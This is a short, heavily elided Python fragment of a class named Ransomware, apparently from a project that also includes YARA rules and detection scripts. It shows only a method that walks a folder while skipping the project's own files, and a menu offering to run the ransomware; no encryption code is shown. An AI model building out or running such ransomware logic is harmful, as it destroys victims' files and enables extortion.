...
class Ransomware:
    ...
    def get_files_in_folder(self, path):
        ...
        for file in os.listdir(path):
            ...
            if file == 'gui.ui' or file =="ransomware.yar" or file=="ransomkey.yar" or file == "finalPrototype.py" or file =='detect.py' or file =='detect2.sh' or file == sys.argv[0]:
                continue
...
if __name__ == '__main__':
    ...
    print(path)
    print("Menu")
    print("1. Ransomware (Dont not encrypt twice)")
